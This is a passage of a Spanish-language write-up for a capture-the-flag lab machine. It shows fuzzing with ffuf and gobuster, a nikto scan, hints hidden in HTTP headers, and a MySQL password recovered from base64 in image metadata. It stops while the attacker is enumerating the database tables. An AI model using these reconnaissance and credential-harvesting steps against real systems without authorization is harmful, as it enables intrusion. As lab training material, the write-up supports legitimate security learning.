+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Gracias al escaneo de servicios, vemos que la página web activa en el <strong>puerto 80</strong> no utiliza un dominio y vemos información sobre la versión del <strong>servicio MySQL</strong>, etc.</p>
+<p>Entonces, empecemos por la página web.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-scapeRoom/Captura1.png">
+</p>
+<p>Es una página que monitorea varios sensores.</p>
+<p>Veamos qué nos dice <strong>Wappalizer</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-scapeRoom/Captura2.png">
+</p>
+<p>No hay mucho que nos ayude.</p>
+<p>Revisando el código fuente, encontraremos una cadena en <strong>base64</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-scapeRoom/Captura3.png">
+</p>
+<p>Al decodificarla con el comando <strong>base64</strong>, vemos solo un mensaje:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#34;QSB2ZWNlcywgbG8gbcOhcyBvYnZpbyBlcyBsbyBxdWUgc2UgcGFzYSBwb3IgYWx0by4gVHUgw7puaWNhIHNhbGlkYSBlcyB2ZXIgbG8gcXVlIG90cm9zIG5vIHZlbi4gRWwgdGllbXBvIGNvcnJlIH
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kgY2FkYSBwaXN0YSBlcyB1bmEgcGllemEgY2xhdmUgZGVsIHJvbXBlY2FiZXphcy4K&#34;</span> | base64 -d
+</span></span><span style="display:flex;"><span>A veces, lo más obvio es lo que se pasa por alto. Tu única salida es ver lo que otros no ven. El tiempo corre y cada pista es una pieza clave del rompecabezas.
+</span></span></code></pre></div><p>No encontraremos algo más, así que podemos aplicar <strong>Fuzzing</strong> para buscar directorios y/o archivos ocultos.</p>
+<h3 id="fuzz">Fuzzing</h3>
+<p>Primero probemos con la herramienta <strong>ffuf</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt:FUZZ -u http://192.168.110.10/FUZZ -t <span style="color:#ae81ff">300</span> -mc 200,301 -e .php,.txt,.html
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.1.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://192.168.110.10/FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt
+</span></span><span style="display:flex;"><span> :: Extensions       : .php .txt .html 
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200,301
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>administracion          <span style="color:#f92672">[</span>Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 7ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>css                     <span style="color:#f92672">[</span>Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 2ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>index.php               <span style="color:#f92672">[</span>Status: 200, Size: 4268, Words: 1608, Lines: 133, Duration: 6ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>index.php               <span style="color:#f92672">[</span>Status: 200, Size: 4268, Words: 1608, Lines: 133, Duration: 26ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.                       <span style="color:#f92672">[</span>Status: 200, Size: 4268, Words: 1608, Lines: 133, Duration: 287ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>513480/513480<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">236</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:07:58<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">641</span> ::
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-mc</em></td>
+					<td>Para aplicar un filtro que solo muestre resultados con un código de estado específico.</td>
+			</tr>
+			<tr>
+					<td><em>-e</em></td>
+					<td>Para específicar la extensión de un archivo a buscar.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Ahora probemos con <strong>gobuster</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://192.168.110.10 -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt -t <span style="color:#ae81ff">300</span> -x php,txt,html -s 200,301 -b <span style="color:#e6db74">&#34;&#34;</span> --ne
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.8.2
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:            http://192.168.110.10
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:         GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:        <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes:   200,301
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:     gobuster/3.8.2
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:     html,php,txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:        10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>administracion       <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 325<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.110.10/administracion/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 314<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.110.10/css/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 4273<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 4273<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.                    <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 4273<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">513480</span> / <span style="color:#ae81ff">513480</span> <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-s</em></td>
+					<td>Para aplicar un filtro que muestre solo los códigos de estado específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-b</em></td>
+					<td>Para que funcione el filtro anterior.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;ne</em></td>
+					<td>Para que no muestre errores.</td>
+			</tr>
+			<tr>
+					<td><em>-x</em></td>
+					<td>Para específicar la extensión de un archivo a buscar.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Encontramos un directorio llamado <strong>administracion</strong>, pero al entrar en este, no tendremos permisos suficientes:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-scapeRoom/Captura4.png">
+</p>
+<p>Sin embargo, puede que podamos ver el contenido de este directorio, por lo que también le aplicaremos <strong>Fuzzing</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt:FUZZ -u http://192.168.110.10/administracion/FUZZ -t <span style="color:#ae81ff">300</span> -mc 200,301 -e .php,.txt,.html
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.1.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://192.168.110.10/administracion/FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt
+</span></span><span style="display:flex;"><span> :: Extensions       : .php .txt .html 
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200,301
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>login.php               <span style="color:#f92672">[</span>Status: 200, Size: 2714, Words: 1004, Lines: 107, Duration: 49ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>513480/513480<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">232</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:08:35<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">1075</span> ::
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-mc</em></td>
+					<td>Para aplicar un filtro que solo muestre resultados con un código de estado específico.</td>
+			</tr>
+			<tr>
+					<td><em>-e</em></td>
+					<td>Para específicar la extensión de un archivo a buscar.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Muy bien, encontramos una página llamada <strong>login.php</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-scapeRoom/Captura5.png">
+</p>
+<p>Por ahora no tenemos credenciales, así que tenemos que buscar una forma de encontrarlas.</p>
+<h3 id="DNS">Descubriendo Dominio y Subdominio Ocultos en Cabeceras HTTP con Nikto</h3>
+<p>Al no encontrar alguna pista más, utilizamos la herramienta <strong>nikto</strong> para comprobar si había algo que se nos escapaba.</p>
+<p>Observa el resultado:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nikto -host 192.168.110.10
+</span></span><span style="display:flex;"><span>- Nikto v2.5.0
+</span></span><span style="display:flex;"><span>---------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>+ Target IP:          192.168.110.10
+</span></span><span style="display:flex;"><span>+ Target Hostname:    192.168.110.10
+</span></span><span style="display:flex;"><span>+ Target Port:        <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>+ Start Time:         2026-05-06 13:17:04 <span style="color:#f92672">(</span>GMT-6<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>---------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>+ Server: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+</span></span><span style="display:flex;"><span>+ /: Uncommon header <span style="color:#e6db74">&#39;x-hint&#39;</span> found, with contents: Subdominios.... info.
+</span></span><span style="display:flex;"><span>+ /: Uncommon header <span style="color:#e6db74">&#39;x-contact&#39;</span> found, with contents: info@sensores.thl.
+</span></span><span style="display:flex;"><span>+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+</span></span><span style="display:flex;"><span>+ No CGI Directories found <span style="color:#f92672">(</span>use <span style="color:#e6db74">&#39;-C all&#39;</span> to force check all possible dirs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>+ Apache/2.4.41 appears to be outdated <span style="color:#f92672">(</span>current is at least Apache/2.4.54<span style="color:#f92672">)</span>. Apache 2.2.34 is the EOL <span style="color:#66d9ef">for</span> the 2.x branch.
+</span></span><span style="display:flex;"><span>+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+</span></span><span style="display:flex;"><span>+ /css/: Directory indexing found.
+</span></span><span style="display:flex;"><span>+ /css/: This might be interesting.
+</span></span><span style="display:flex;"><span>+ <span style="color:#ae81ff">8102</span> requests: <span style="color:#ae81ff">0</span> error<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">8</span> item<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> reported on remote host
+</span></span><span style="display:flex;"><span>+ End Time:           2026-05-06 13:17:51 <span style="color:#f92672">(</span>GMT-6<span style="color:#f92672">)</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">47</span> seconds<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>---------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>+ <span style="color:#ae81ff">1</span> host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> tested
+</span></span></code></pre></div><p>Podemos ver que hay 2 cabeceras que nos indican un dominio y un subdominio.</p>
+<p>Podemos consultarlas con <strong>curl</strong>, indicando que nos muestre las cabeceras:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -i http://192.168.110.10 | head -n <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Date: Thu, <span style="color:#ae81ff">07</span> May <span style="color:#ae81ff">2026</span> 00:22:05 GMT
+</span></span><span style="display:flex;"><span>Server: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Vary: Accept-Encoding
+</span></span><span style="display:flex;"><span>X-Hint: Subdominios.... info
+</span></span><span style="display:flex;"><span>X-Contact: info@sensores.thl
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">4269</span>
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+</span></span></code></pre></div><p>Guardemos ese dominio y subdominio en el <code>/etc/hosts</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;192.168.110.10 sensores.thl info.sensores.thl&#34;</span> &gt;&gt; /etc/hosts
+</span></span></code></pre></div><p>Y entremos en estos para ver qué encontramos.</p>
+<p>Primero el dominio <strong>sensores.thl</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-scapeRoom/Captura6.png">
+</p>
+<p>Si te das cuenta, no cambia nada con la página principal que habíamos visto antes.</p>
+<p>Ahora el subdominio <strong>info.sensores.thl</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-scapeRoom/Captura7.png">
+</p>
+<p>Ahora sí que cambia, pues podemos ver más información agregada, pero no hay algo que nos ayude.</p>
+<h4 id="metadatos">Analizando Metadatos de una Imagen y Ganando Acceso al Servicio MySQL</h4>
+<p>Algo que podemos hacer es analizar los metadatos de la imagen que encontramos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://info.sensores.thl/images/sensor_overview.png
+</span></span></code></pre></div><p>Para ver los metadatos, usaremos la herramienta <strong>exiftool</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exiftool sensor_overview.png
+</span></span><span style="display:flex;"><span>ExifTool Version Number         : 13.44
+</span></span><span style="display:flex;"><span>File Name                       : sensor_overview.png
+</span></span><span style="display:flex;"><span>Directory                       : .
+</span></span><span style="display:flex;"><span>File Size                       : <span style="color:#ae81ff">1931</span> kB
+</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2024:11:03 11:02:04-06:00
+</span></span><span style="display:flex;"><span>File Access Date/Time           : 2026:05:06 13:20:25-06:00
+</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2026:05:06 13:20:25-06:00
+</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
+</span></span><span style="display:flex;"><span>File Type                       : PNG
+</span></span><span style="display:flex;"><span>File Type Extension             : png
+</span></span><span style="display:flex;"><span>MIME Type                       : image/png
+</span></span><span style="display:flex;"><span>Image Width                     : <span style="color:#ae81ff">1147</span>
+</span></span><span style="display:flex;"><span>Image Height                    : <span style="color:#ae81ff">1147</span>
+</span></span><span style="display:flex;"><span>Bit Depth                       : <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>Color Type                      : RGB
+</span></span><span style="display:flex;"><span>Compression                     : Deflate/Inflate
+</span></span><span style="display:flex;"><span>Filter                          : Adaptive
+</span></span><span style="display:flex;"><span>Interlace                       : Noninterlaced
+</span></span><span style="display:flex;"><span>Comment                         : YWN1dGU6SVM0eUJ2Znd4cFhVWnNCeGhDWHI1bXV2M2RYZFFnIQo<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>Image Size                      : 1147x1147
+</span></span><span style="display:flex;"><span>Megapixels                      : 1.3
+</span></span></code></pre></div><p>Observa que tiene un comentario agregado como una cadena en <strong>base64</strong>.</p>
+<p>Vamos a decodificarla:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#34;YWN1dGU6SVM0eUJ2Znd4cFhVWnNCeGhDWHI1bXV2M2RYZFFnIQo=&#34;</span> | base64 -d
+</span></span><span style="display:flex;"><span>acute:IS4yBvfwxpXUZsBxhCXr5muv3dXdQg!
+</span></span></code></pre></div><p>Parece que encontramos credenciales de acceso.</p>
+<p>Se intentó utilizar en el login que encontramos en la página web, pero no funcionará. Sin embargo, al probarlo para entrar al <strong>servicio MySQL</strong> nos dará acceso:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mysql -h 192.168.110.10 -u <span style="color:#e6db74">&#39;acute&#39;</span> -p --skip-ssl
+</span></span><span style="display:flex;"><span>Enter password: 
+</span></span><span style="display:flex;"><span>Welcome to the MariaDB monitor.  Commands end with ; or <span style="color:#ae81ff">\g</span>.
+</span></span><span style="display:flex;"><span>Your MySQL connection id is <span style="color:#ae81ff">24</span>
+</span></span><span style="display:flex;"><span>Server version: 8.0.40-0ubuntu0.20.04.1 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#39;help;&#39;</span> or <span style="color:#e6db74">&#39;\h&#39;</span> <span style="color:#66d9ef">for</span> help. Type <span style="color:#e6db74">&#39;\c&#39;</span> to clear the current input statement.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MySQL <span style="color:#f92672">[(</span>none<span style="color:#f92672">)]</span>&gt;
+</span></span></code></pre></div><h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="MySQL">Enumeración del Servicio MySQL y Desencriptando Contraseña Almacenada en Base de Datos para Ganar Acceso a Login Web y SSH</h3>
+<p>Veamos qué bases de datos existen:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>MySQL <span style="color:#f92672">[(</span>none<span style="color:#f92672">)]</span>&gt; show databases;
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| Database           |
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| SensorData         |
+</span></span><span style="display:flex;"><span>| information_schema |
+</span></span><span style="display:flex;"><span>| performance_schema |
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> rows in set <span style="color:#f92672">(</span>0.003 sec<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Tenemos 1 base de datos llamada <strong>SensorData</strong> y las 2 BDs por defecto.</p>
+<p>Carguemos la BD <strong>SensorData</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>MySQL <span style="color:#f92672">[(</span>none<span style="color:#f92672">)]</span>&gt; use SensorData;
+</span></span><span style="display:flex;"><span>Reading table information <span style="color:#66d9ef">for</span> completion of table and column names
+</span></span><span style="display:flex;"><span>You can turn off this feature to get a quicker startup with -A
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Database changed
+</span></span></code></pre></div><p>Veamos las tablas existentes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>MySQL <span style="color:#f92672">[</span>SensorData<span style="color:#f92672">]</span>&gt; show tables;
+</span></span><span style="display:flex;"><span>+------------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| Tables_in_SensorData   |
+</span></span><span style="display:flex;"><span>+------------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| login                  |
+</span></span><span style="display:flex;"><span>| sensor_readings        |
+</span></span><span style="display:flex;"><span>| sensor_readings_backup |
+</span></span><span style="display:flex;"><span>+------------------------+
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> rows in set <span style="color:#f92672">(</span>0.002 sec<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Vemos 3 tablas, pero la que nos interesa es la tabla login.</p>
